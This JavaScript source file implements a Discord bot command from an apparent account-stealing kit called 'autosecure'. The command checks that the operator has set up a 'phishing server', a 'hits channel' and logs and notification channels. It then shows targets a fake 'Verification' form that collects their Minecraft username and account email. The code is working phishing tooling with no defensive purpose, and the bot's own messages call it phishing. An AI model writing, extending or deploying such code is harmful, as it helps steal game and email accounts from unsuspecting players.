const { TextInputStyle } = require("discord.js");
const modalBuilder = require("../../utils/modalBuilder");
const { queryParams } = require("../../../db/db");
let linkAccount = {
  name: `link account`,
  callback: async (client, interaction) => {
    if (interaction.replied || interaction.deferred) {
      return; 
    }
    let server = await queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [client.username]);
    if (server.length == 0) return interaction.reply({ content: `You don't have access to autosecure!`, ephemeral: true });
    server = server[0];
    if (server.server_id != interaction.guildId) return interaction.reply({ content: `Configure your phishing server using **/set**`, ephemeral: true });
    if (!server.logs_channel) return interaction.reply({ content: `Configure your logs channel using **/set**`, ephemeral: true });
    if (!server.hits_channel) return interaction.reply({ content: `Configure your hits channel using **/set**`, ephemeral: true });
    if (!server.notification_channel) return interaction.reply({ content: `Configure your notifications channel using **/set**`, ephemeral: true });
    await interaction.showModal(modalBuilder(
      `Verification`, `Verification`, [{
        setCustomId: 'minecraftusername',
        setMaxLength: 16,
        setMinLength: 1,
        setRequired: true,
        setLabel: "Minecraft username",
        setPlaceholder: "Username...",
        setStyle: TextInputStyle.Short
      }, {
        setCustomId: 'Email',
        setMaxLength: 60,
        setMinLength: 3,
        setRequired: true,
        setLabel: "Minecraft email",
        setPlaceholder: "Email...",
        setStyle: TextInputStyle.Short
      }]
    ));
  }
}
module.exports = linkAccount;